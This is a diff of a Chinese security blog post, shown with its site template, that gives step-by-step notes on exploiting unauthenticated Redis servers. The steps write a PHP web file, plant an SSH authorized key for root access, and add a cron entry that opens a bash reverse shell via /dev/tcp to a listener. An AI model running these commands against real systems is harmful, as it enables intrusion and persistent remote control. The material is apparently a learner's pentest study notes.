@@ -2,7 +2,7 @@
 <html lang="en">
 
 <!-- Head tag -->
-<head><meta name="generator" content="Hexo 3.8.0">
+<head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -25,14 +25,20 @@
     <link rel="canonical" href="https://pengpengp.github.io/2019/02/18/redis未授权漏洞/">
 
     <!-- Bootstrap Core CSS -->
-    <link rel="stylesheet" href="/css/bootstrap.min.css">
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
 
     <!-- Custom CSS -->
-    <link rel="stylesheet" href="/css/blog-style.css">
+    
+<link rel="stylesheet" href="/css/blog-style.css">
+
 
     <!-- Pygments Github CSS -->
-    <link rel="stylesheet" href="/css/syntax.css">
-</head>
+    
+<link rel="stylesheet" href="/css/syntax.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
 
 <style>
 
@@ -43,8 +49,8 @@
 <!-- hack iOS CSS :active style -->
 <body ontouchstart="" class="animated fadeIn">
 <!-- Navigation -->
-<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost="true" data-istags="false
-" data-ishome="false">
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost = "true" data-istags="false
+" data-ishome = "false" >
     <div class="container-fluid">
         <!-- Brand and toggle get grouped for better mobile display -->
         <div class="navbar-header page-scroll">
@@ -119,7 +125,8 @@
 <!--only post-->
 
 
-<img class="wechat-title-img" src="">
+<img class="wechat-title-img"
+     src="">
 
 
 <style>
@@ -146,7 +153,8 @@
                     </span>
                     <div class="tags text-center">
                         
-                        <a class="tag" href="/tags/#redis漏洞(一般内网）" title="redis漏洞(一般内网）">redis漏洞(一般内网）</a>
+                        <a class="tag" href="/tags/#redis漏洞(一般内网）"
+                           title="redis漏洞(一般内网）">redis漏洞(一般内网）</a>
                         
                     </div>
                 </div>
@@ -172,13 +180,13 @@
 
 启动:`redis-server`
 
-进入：令开个连接:`redis-cli`
-</code></pre><ul>
+进入：令开个连接:`redis-cli`</code></pre>
+<ul>
 <li><p>redis特点：数据在文件中存储  ,默认root权限(低权限时会无权限写日志导致启动失败)，6379端口无密码</p>
 </li>
 <li><p>利用redis数据库创建任意文件方法：</p>
-<pre><code>1.设置数据库文件存储路径：    `config set dir ./`
-</code></pre><p>​        2.设置数据库文件名称:<code>config set dbfilename zs</code></p>
+<pre><code>    1.设置数据库文件存储路径：    `config set dir ./`</code></pre>
+<p>​        2.设置数据库文件名称:<code>config set dbfilename zs</code></p>
 <p>​        3.设置键和值：<code>set name &quot;zs&quot;</code></p>
 <p>​        4.保存：<code>save</code></p>
 <p>​        5.在目录下就有一个zs文件     </p>
@@ -188,37 +196,36 @@
 <p>​        1.<code>config set dir /var/www/html/</code><br>​        2.<code>config set dbfilename 404.php</code><br>​        3.<code>set name &quot;&lt;?php phpinfo()?&gt;&quot;</code><br>​        4.<code>save</code><br>​        5.在浏览器访问ip/404.php即可执行phpinfo 命令</p>
 </li>
 <li><p>常用命令：</p>
-<pre><code>info查看信息
-get/set
-    FLUSHALL：清空键值
-    get 键：获取值
-    config get dir：获取路径
-    config get dbfilename：获取文件名
-</code></pre><hr>
+<pre><code>    info查看信息
+    get/set
+        FLUSHALL：清空键值
+        get 键：获取值
+        config get dir：获取路径
+        config get dbfilename：获取文件名</code></pre>
+<hr>
 <hr>
 </li>
 </ul>
 <h1 id="二。redis利用未授权漏洞ssh免密码登陆："><a href="#二。redis利用未授权漏洞ssh免密码登陆：" class="headerlink" title="二。redis利用未授权漏洞ssh免密码登陆："></a>二。redis利用未授权漏洞ssh免密码登陆：</h1><p>​                1.cat authorized_keys：秘钥内容<br>​                    2.FlUSHALL<br>​                    3.config set dir /root/.ssh<br>​                    4.config set dbfilename authorized_keys<br>​                    5.set sshkey “\n\n\n内容\n\n\n”        //换行符保证字符串分隔开<br>​                    6.save<br>​<br>​    条件：/etc/ssh/sshd_config |grep key –&gt;pubkeyAuthentication_keys 开启，即需要ssh先免密钥登陆一次</p>
 <ul>
-<li>流程：找到开放的6379端口：    <pre><code>1.redis-cli -h ip 连接远程服务器redis
-2.执行info能否成功
-3.用config set dir /root看看是不是root权限
-4.config set dir /root/.ssh
-5.config set dbfilename authorized_keys
-6.set sshkey &quot;\n\n\n公钥\n\n\n&quot;
-7.save
-</code></pre></li>
+<li>流程：找到开放的6379端口：    <pre><code>    1.redis-cli -h ip 连接远程服务器redis
+    2.执行info能否成功
+    3.用config set dir /root看看是不是root权限
+    4.config set dir /root/.ssh
+    5.config set dbfilename authorized_keys
+    6.set sshkey &quot;\n\n\n公钥\n\n\n&quot;
+    7.save</code></pre>
+</li>
 </ul>
-<p>  ​    连接：把私钥保存成文件<br>  ​        ssh -i 私钥文件  <a href="mailto:root@192.168.11.84" target="_blank" rel="noopener">root@192.168.11.84</a></p>
+<p>  ​    连接：把私钥保存成文件<br>  ​        ssh -i 私钥文件  <a href="mailto:&#x72;&#x6f;&#111;&#x74;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#46;&#49;&#x31;&#x2e;&#56;&#52;">&#x72;&#x6f;&#111;&#x74;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#46;&#49;&#x31;&#x2e;&#56;&#52;</a></p>
 <hr>
 <hr>
-<h1 id="三。计划任务漏洞："><a href="#三。计划任务漏洞：" class="headerlink" title="三。计划任务漏洞："></a>三。计划任务漏洞：</h1><p>​    计划任务：<br>​            crontab -l 查看计划任务ss<br>​            <code>* * * * * echo &#39;date\nhello!&#39;&gt;&gt;/tmp/email`</code></p>
-<p>​        <code></code><em> </em> <em> </em> <em><code>代表分时日月周
-​        例子 :</code></em> 8 <em>/1 </em> * 命令`：每天八点执行命令<br>​                添加任务：crontab -e进入编辑模式,</p>
+<h1 id="三。计划任务漏洞："><a href="#三。计划任务漏洞：" class="headerlink" title="三。计划任务漏洞："></a>三。计划任务漏洞：</h1><p>​    计划任务：<br>​            crontab -l 查看计划任务ss<br>​            `* * * * * echo ‘date\nhello!’&gt;&gt;/tmp/email``</p>
+<p>​        ``* * * * <em><code>代表分时日月周 ​        例子 :    </code></em> 8 */1 * * 命令`：每天八点执行命令<br>​                添加任务：crontab -e进入编辑模式,</p>
 <p>​            查看添加的任务：cat   /vat/spool/cron/root  //root是指用户    //小技巧：tail -f 文件   滚动刷新</p>
 <p>​            </p>
-<p><strong>练习：每分钟反弹shell到我的电脑*</strong><br>        1.用redis进行登陆：redis-cli -h ip<br>        2.<code>info</code>查看能否执行<br>        3.用<code>config set dir /root</code>看看是不是root权限<br>        4.<code>config set dir /var/spool/cron/</code><br>        5.<code>config set dbfilename root</code><br>        6.<code>set name    &quot;\n*/1 * * * *     bash -i &gt;&amp; /dev/tcp/IP地址/监听端口 0&gt;&amp;1\n&quot;</code><br>        7.<code>save</code><br>        8.本地nc中 <code>nc -lnvp40000</code> 开始监听</p>
-<p>遇到windows+redis的情况：<a href="https://www.anquanke.com/post/id/170360" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170360</a></p>
+<p>*<em>练习：每分钟反弹shell到我的电脑**</em><br>        1.用redis进行登陆：redis-cli -h ip<br>        2.<code>info</code>查看能否执行<br>        3.用<code>config set dir /root</code>看看是不是root权限<br>        4.<code>config set dir /var/spool/cron/</code><br>        5.<code>config set dbfilename root</code><br>        6.<code>set name    &quot;\n*/1 * * * *     bash -i &gt;&amp; /dev/tcp/IP地址/监听端口 0&gt;&amp;1\n&quot;</code><br>        7.<code>save</code><br>        8.本地nc中 <code>nc -lnvp40000</code> 开始监听</p>
+<p>遇到windows+redis的情况：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/170360">https://www.anquanke.com/post/id/170360</a></p>
 
                 <hr>
                 
@@ -226,12 +233,14 @@ get/set
                 <ul class="pager">
                     
                     <li class="previous">
-                        <a href="/2019/02/24/信息搜集/" data-toggle="tooltip" data-placement="top" title="信息搜集">&larr; Previous Post</a>
+                        <a href="/2019/02/24/信息搜集/" data-toggle="tooltip" data-placement="top"
+                           title="信息搜集">&larr; Previous Post</a>
                     </li>
                     
                     
                     <li class="next">
-                        <a href="/2019/02/17/文件包含/" data-toggle="tooltip" data-placement="top" title="文件包含">Next Post &rarr;</a>
+                        <a href="/2019/02/17/文件包含/" data-toggle="tooltip" data-placement="top"
+                           title="文件包含">Next Post &rarr;</a>
                     </li>
                     
                 </ul>
@@ -250,8 +259,8 @@ get/set
 
             <div class="hidden-xs col-sm-3 toc-col">
                 <div class="toc-wrap">
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理：利用redis高权限免密登陆的特性，向目标机器保存数据库文件"><span class="toc-text">原理：利用redis高权限免密登陆的特性，向目标机器保存数据库文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用：redis漏洞可以向目标机器写文件，饶过密码连接，反弹shell等"><span class="toc-text">利用：redis漏洞可以向目标机器写文件，饶过密码连接，反弹shell等</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防御：限制redis权限"><span class="toc-text">防御：限制redis权限</span></a></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#一。-数据库原理：redis数据库-临时存储数据库"><span class="toc-text">一。 数据库原理：redis数据库(临时存储数据库)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#二。redis利用未授权漏洞ssh免密码登陆："><span class="toc-text">二。redis利用未授权漏洞ssh免密码登陆：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#三。计划任务漏洞："><span class="toc-text">三。计划任务漏洞：</span></a>
-                </li></div>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A%E5%88%A9%E7%94%A8redis%E9%AB%98%E6%9D%83%E9%99%90%E5%85%8D%E5%AF%86%E7%99%BB%E9%99%86%E7%9A%84%E7%89%B9%E6%80%A7%EF%BC%8C%E5%90%91%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%BF%9D%E5%AD%98%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6"><span class="toc-text">原理：利用redis高权限免密登陆的特性，向目标机器保存数据库文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%EF%BC%9Aredis%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BB%A5%E5%90%91%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E5%86%99%E6%96%87%E4%BB%B6%EF%BC%8C%E9%A5%B6%E8%BF%87%E5%AF%86%E7%A0%81%E8%BF%9E%E6%8E%A5%EF%BC%8C%E5%8F%8D%E5%BC%B9shell%E7%AD%89"><span class="toc-text">利用：redis漏洞可以向目标机器写文件，饶过密码连接，反弹shell等</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%EF%BC%9A%E9%99%90%E5%88%B6redis%E6%9D%83%E9%99%90"><span class="toc-text">防御：限制redis权限</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%82-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%EF%BC%9Aredis%E6%95%B0%E6%8D%AE%E5%BA%93-%E4%B8%B4%E6%97%B6%E5%AD%98%E5%82%A8%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">一。 数据库原理：redis数据库(临时存储数据库)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%82redis%E5%88%A9%E7%94%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9Essh%E5%85%8D%E5%AF%86%E7%A0%81%E7%99%BB%E9%99%86%EF%BC%9A"><span class="toc-text">二。redis利用未授权漏洞ssh免密码登陆：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%82%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="toc-text">三。计划任务漏洞：</span></a>
+                </div>
             </div>
         </div>
 
@@ -302,11 +311,11 @@ get/set
 
                 </ul>
                 <p class="copyright text-muted">
-                    Copyright &copy; pengpengp&#39;s BLOG 2019
+                    Copyright &copy; pengpengp&#39;s BLOG 2020
                     <br>
                     <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
                     <br>
-                    Theme by <a href="https://haojen.github.io/">Haojen Ma</a>
+                    Theme by <a target="_blank" rel="noopener" href="https://haojen.github.io/">Haojen Ma</a>
                 </p>
 
             </div>
@@ -315,13 +324,19 @@ get/set
 </footer>
 
 <!-- jQuery -->
+
 <script src="/js/jquery.min.js"></script>
 
+
 <!-- Bootstrap Core JavaScript -->
+
 <script src="/js/bootstrap.min.js"></script>
 
+
 <!-- Custom Theme JavaScript -->
+
 <script src="/js/blog.js"></script>
+
 
 <!-- async load function -->
 <script>
